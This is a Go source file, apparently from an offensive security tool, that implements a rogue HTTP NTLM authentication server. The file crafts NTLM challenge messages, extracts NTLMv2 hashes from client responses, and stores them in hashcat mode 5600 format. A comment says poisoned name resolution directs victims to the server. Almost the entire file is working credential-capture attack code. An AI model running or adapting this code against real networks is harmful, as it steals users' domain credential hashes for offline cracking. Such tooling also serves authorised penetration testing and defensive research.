package commands

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

// ntlmCapturedHash represents a captured NTLMv2 hash in hashcat-compatible format.
type ntlmCapturedHash struct {
	Username        string `json:"username"`
	Domain          string `json:"domain"`
	ServerChallenge string `json:"server_challenge"`
	NTProofStr      string `json:"nt_proof_str"`
	NTLMv2Blob      string `json:"ntlmv2_blob"`
	HashcatFormat   string `json:"hashcat"`
}

// buildNTLMType2 constructs an NTLM Type 2 (Challenge) message with the given
// server challenge. Returns the raw NTLMSSP bytes (not SPNEGO-wrapped).
// Includes TargetInfo AVPairs required by modern NTLMv2 clients (Windows SMB,
// smbclient) which refuse to authenticate without target information.
func buildNTLMType2(challenge [8]byte) []byte {
	// Build TargetInfo AVPairs: DomainName + ComputerName + EOL
	domainName := ntlmEncodeUTF16LE("WORKGROUP")
	computerName := ntlmEncodeUTF16LE("SERVER")

	// AVPair format: Type(2) + Length(2) + Value(variable)
	targetInfo := make([]byte, 0, 4+len(domainName)+4+len(computerName)+4)
	// MsvAvNbDomainName (type 2)
	targetInfo = append(targetInfo, 0x02, 0x00)
	targetInfo = binary.LittleEndian.AppendUint16(targetInfo, uint16(len(domainName)))
	targetInfo = append(targetInfo, domainName...)
	// MsvAvNbComputerName (type 1)
	targetInfo = append(targetInfo, 0x01, 0x00)
	targetInfo = binary.LittleEndian.AppendUint16(targetInfo, uint16(len(computerName)))
	targetInfo = append(targetInfo, computerName...)
	// MsvAvEOL (type 0, length 0)
	targetInfo = append(targetInfo, 0x00, 0x00, 0x00, 0x00)

	targetName := ntlmEncodeUTF16LE("WORKGROUP")

	// Type 2 header = 56 bytes, payload = targetName + targetInfo
	headerSize := 56
	payloadOffset := headerSize
	targetNameOffset := payloadOffset
	targetInfoOffset := targetNameOffset + len(targetName)
	totalSize := targetInfoOffset + len(targetInfo)

	msg := make([]byte, totalSize)
	copy(msg[0:8], []byte("NTLMSSP\x00"))
	binary.LittleEndian.PutUint32(msg[8:12], 2) // Type 2

	// Target Name security buffer
	binary.LittleEndian.PutUint16(msg[12:14], uint16(len(targetName)))
	binary.LittleEndian.PutUint16(msg[14:16], uint16(len(targetName)))
	binary.LittleEndian.PutUint32(msg[16:20], uint32(targetNameOffset))

	// Negotiate Flags:
	// NEGOTIATE_UNICODE(0x01) | REQUEST_TARGET(0x04) | NEGOTIATE_NTLM(0x200) |
	// NEGOTIATE_ALWAYS_SIGN(0x8000) | NEGOTIATE_NTLM2(0x80000) |
	// TARGET_TYPE_SERVER(0x20000) | NEGOTIATE_TARGET_INFO(0x800000)
	flags := uint32(0x00828235)
	binary.LittleEndian.PutUint32(msg[20:24], flags)

	// Server Challenge
	copy(msg[24:32], challenge[:])
	// Reserved (8 bytes at offset 32) already zeroed

	// Target Info security buffer (offset 40)
	binary.LittleEndian.PutUint16(msg[40:42], uint16(len(targetInfo)))
	binary.LittleEndian.PutUint16(msg[42:44], uint16(len(targetInfo)))
	binary.LittleEndian.PutUint32(msg[44:48], uint32(targetInfoOffset))

	// Copy payload
	copy(msg[targetNameOffset:], targetName)
	copy(msg[targetInfoOffset:], targetInfo)

	return msg
}

// ntlmEncodeUTF16LE encodes an ASCII string as UTF-16LE bytes for NTLM messages.
func ntlmEncodeUTF16LE(s string) []byte {
	out := make([]byte, len(s)*2)
	for i := 0; i < len(s); i++ {
		out[i*2] = s[i]
		out[i*2+1] = 0
	}
	return out
}

// extractNTLMv2Hash extracts NTLMv2 hash components from an NTLM Type 3 message
// and returns them in hashcat mode 5600 format.
// Format: username::domain:ServerChallenge:NTProofStr:NTLMv2ClientBlob
func extractNTLMv2Hash(type3 []byte, serverChallenge [8]byte) *ntlmCapturedHash {
	if len(type3) < 72 {
		return nil
	}
	if !bytes.Equal(type3[0:8], sniffNTLMSig) {
		return nil
	}
	if binary.LittleEndian.Uint32(type3[8:12]) != 3 {
		return nil
	}

	readSecBuf := func(offset int) []byte {
		if offset+8 > len(type3) {
			return nil
		}
		fLen := binary.LittleEndian.Uint16(type3[offset : offset+2])
		fOff := binary.LittleEndian.Uint32(type3[offset+4 : offset+8])
		end := uint32(fLen) + fOff
		if fLen == 0 || end > uint32(len(type3)) {
			return nil
		}
		return type3[fOff:end]
	}

	unicode := false
	if len(type3) >= 64 {
		flags := binary.LittleEndian.Uint32(type3[60:64])
		unicode = flags&0x01 != 0 // NTLMSSP_NEGOTIATE_UNICODE
	}

	readTextField := func(offset int) string {
		data := readSecBuf(offset)
		if data == nil {
			return ""
		}
		if unicode {
			return sniffDecodeUTF16LE(data)
		}
		return string(data)
	}

	// NtChallengeResponse at offset 20
	ntResponse := readSecBuf(20)
	if len(ntResponse) < 24 {
		return nil
	}

	user := readTextField(36)
	if user == "" {
		return nil
	}
	domain := readTextField(28)

	// NTProofStr = first 16 bytes of NtChallengeResponse
	ntProofStr := hex.EncodeToString(ntResponse[:16])
	// Client blob = remaining bytes
	ntlmv2Blob := hex.EncodeToString(ntResponse[16:])
	challengeHex := hex.EncodeToString(serverChallenge[:])

	// Hashcat mode 5600: user::domain:challenge:ntproofstr:blob
	hashcat := fmt.Sprintf("%s::%s:%s:%s:%s",
		user, domain, challengeHex, ntProofStr, ntlmv2Blob)

	return &ntlmCapturedHash{
		Username:        user,
		Domain:          domain,
		ServerChallenge: challengeHex,
		NTProofStr:      ntProofStr,
		NTLMv2Blob:      ntlmv2Blob,
		HashcatFormat:   hashcat,
	}
}

// captureHTTPNTLM starts an HTTP server that challenges clients with NTLM
// authentication to capture NTLMv2 hashes. This is the primary hash capture
// mechanism — poisoned name resolution directs victims here.
func captureHTTPNTLM(ctx context.Context, listenAddr string, mu *sync.Mutex, result *poisonResult) error {
	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		return fmt.Errorf("bind HTTP %s: %w", listenAddr, err)
	}
	defer listener.Close()

	go func() {
		<-ctx.Done()
		listener.Close()
	}()

	for {
		conn, err := listener.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return nil
			default:
				continue
			}
		}
		go handleHTTPNTLMConn(conn, mu, result)
	}
}

// handleHTTPNTLMConn handles a single HTTP connection, performing the NTLM
// challenge-response exchange to capture NTLMv2 hashes.
func handleHTTPNTLMConn(conn net.Conn, mu *sync.Mutex, result *poisonResult) {
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(30 * time.Second))

	var challenge [8]byte
	if _, err := rand.Read(challenge[:]); err != nil {
		return
	}

	buf := make([]byte, 8192)

	for round := 0; round < 3; round++ {
		n, err := conn.Read(buf)
		if err != nil {
			return
		}

		request := string(buf[:n])

		// Look for Authorization: NTLM header
		ntlmData := extractHTTPNTLMAuth(request)
		if ntlmData == nil {
			// No auth — send 401 to trigger NTLM negotiation
			sendHTTP401NTLM(conn, "")
			continue
		}

		if len(ntlmData) < 12 || !bytes.Equal(ntlmData[0:8], sniffNTLMSig) {
			return
		}

		msgType := binary.LittleEndian.Uint32(ntlmData[8:12])

		switch msgType {
		case 1:
			// Type 1 (Negotiate) — respond with Type 2 (Challenge)
			type2 := buildNTLMType2(challenge)
			type2B64 := base64.StdEncoding.EncodeToString(type2)
			sendHTTP401NTLM(conn, type2B64)

		case 3:
			// Type 3 (Authenticate) — extract NTLMv2 hash
			hash := extractNTLMv2Hash(ntlmData, challenge)
			if hash != nil {
				remoteAddr, ok := conn.RemoteAddr().(*net.TCPAddr)
				if !ok {
					return
				}
				localAddr, ok := conn.LocalAddr().(*net.TCPAddr)
				if !ok {
					return
				}
				mu.Lock()
				result.QueriesAnswered++
				result.Credentials = append(result.Credentials, &sniffCredential{
					Protocol:  "ntlmv2",
					SrcIP:     remoteAddr.IP.String(),
					SrcPort:   uint16(remoteAddr.Port),
					DstIP:     localAddr.IP.String(),
					DstPort:   uint16(localAddr.Port),
					Username:  hash.Domain + "\\" + hash.Username,
					Password:  hash.HashcatFormat,
					Detail:    fmt.Sprintf("NTLMv2 HTTP capture | hashcat -m 5600 | domain=%s", hash.Domain),
					Timestamp: time.Now().Unix(),
				})
				mu.Unlock()
			}
			// Send 200 to complete cleanly
			_, _ = conn.Write([]byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"))
			return
		}
	}
}

// extractHTTPNTLMAuth extracts the NTLM blob from an HTTP Authorization header.
func extractHTTPNTLMAuth(request string) []byte {
	lower := strings.ToLower(request)
	idx := strings.Index(lower, "authorization: ntlm ")
	if idx < 0 {
		return nil
	}
	start := idx + len("authorization: ntlm ")
	rest := request[start:]
	end := strings.Index(rest, "\r\n")
	if end < 0 {
		end = len(rest)
	}
	b64Data := strings.TrimSpace(rest[:end])
	if b64Data == "" {
		return nil
	}
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return nil
	}
	return data
}

// sendHTTP401NTLM sends an HTTP 401 response with NTLM challenge.
func sendHTTP401NTLM(conn net.Conn, ntlmB64 string) {
	authHeader := "NTLM"
	if ntlmB64 != "" {
		authHeader = "NTLM " + ntlmB64
	}
	resp := fmt.Sprintf("HTTP/1.1 401 Unauthorized\r\n"+
		"WWW-Authenticate: %s\r\n"+
		"Content-Length: 0\r\n"+
		"Connection: keep-alive\r\n\r\n", authHeader)
	_, _ = conn.Write([]byte(resp))
}
